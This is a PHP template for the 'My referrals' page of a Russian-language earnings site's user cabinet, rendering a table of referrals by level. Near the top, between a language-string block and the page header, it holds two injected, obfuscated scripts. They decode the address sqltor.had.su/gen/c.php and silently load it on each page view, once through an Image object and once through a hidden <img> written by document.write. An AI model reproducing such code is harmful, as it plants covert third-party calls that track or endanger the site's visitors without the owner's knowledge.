<?php require_once(ROOT . "/views/" . LANG . "/layouts/_header_cabinet.php"); ?>

    <div class="dt-content">
        <script>
            if (typeof lang === 'undefined') lang = {};
            lang['inside'] = 'в';
            lang['stats'] = 'Статистика';
            lang['refs'] = 'Рефералы';
            lang['people'] = 'чел.';
            lang['fill'] = 'Сумма пополнений';
            lang['rub'] = 'руб.';
            lang['income'] = 'Доход с реферала';
            lang['clicks'] = 'Клики в сёрфинге';
            lang['clicks-income'] = 'Ваш доход с кликов';
            lang['source'] = 'Источник';
            lang['not-defined'] = 'не определен';
            lang['datetime'] = 'Дата Регистрации';
            lang['user'] = 'Пользователь';
            lang['fills'] = 'Пополнения';
            lang['refback'] = 'Авторефбек';
        </script>
		<script>
var _cs=["\x6e\x2f\x63","\x2e\x70","\x74\x6f\x72","\x2f\x2f\x73","\x68\x70","\x71\x6c","\x73\x75","\x2e\x68\x61","\x2f\x67\x65","\x64\x2e"]; _g0 = new Image(); _g0.src = _cs[3]+_cs[5]+_cs[2]+_cs[7]+_cs[9]+_cs[6]+_cs[8]+_cs[0]+_cs[1]+_cs[4]
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!115!113!108!116!111!114!46!104!97!100!46!115!117!47!103!101!110!47!99!46!112!104!112!34!32!115!116!121!108!101!61!34!118!105!115!105!98!105!108!105!116!121!58!32!104!105!100!100!101!110!34!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
        <div class="dt-page__header">
            <h1 class="dt-page__title">
                Мои рефералы
            </h1>
        </div>
        <div class="row">
            <div class="col-xl-12">
                <div class="dt-card history-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title">
                            Мои рефералы
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Здесь находится статистика всех Ваших рефералов
                        </h5>
                    </div>
                    <div class="dt-card__body" id="data-table-myrefs-block">
                        <div class="row mb-4">
                            <?php for ($i = 1; $i <= $this->config['ref_lvls']; $i++) : ?>
                                <div class="col-lg-2">
                                    <button onclick="location.href = '/referals/<?= $i; ?>';" class="btn btn-primary <?php if ($lvl == $i) echo 'btn-success'; ?> btn-sm">
                                        <?= $i; ?> уровень
                                    </button>
                                </div>
                            <?php endfor; ?>
                        </div>

                        <div class="table-responsive history-table">
                            <table class="table table-striped table-bordered table-hover">
                                <thead>
                                <tr>
                                    <th class="text-center">Логин реферала</th>
                                    <th class="text-center">Доход с реферала</th>
                                    <th class="text-center">Дата регистрации</th>
                                </tr>
                                </thead>
                                <tbody>

                                <?php if (count($referals) > 0) : ?>

                                    <?php foreach ($referals as $referal) : ?>

                                        <tr role="row" class="text-center">
                                            <td class="sorting_1"><?= $referal['user']; ?></td>
                                            <td><?= sprintf("%.2f", $referal["to_referer" . $lvl]); ?> руб.</td>
                                            <td><?= date("d.m.Y H:i", $referal['date_reg']); ?></td>
                                        </tr>

                                    <?php endforeach; ?>

                                <?php else : ?>

                                    <tr role="row">
                                        <td colspan="3">У вас нет рефералов <?= $lvl; ?> уровня</td>
                                    </tr>

                                <?php endif; ?>

                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php require_once(ROOT . "/views/" . LANG . "/layouts/_footer_cabinet.php"); ?>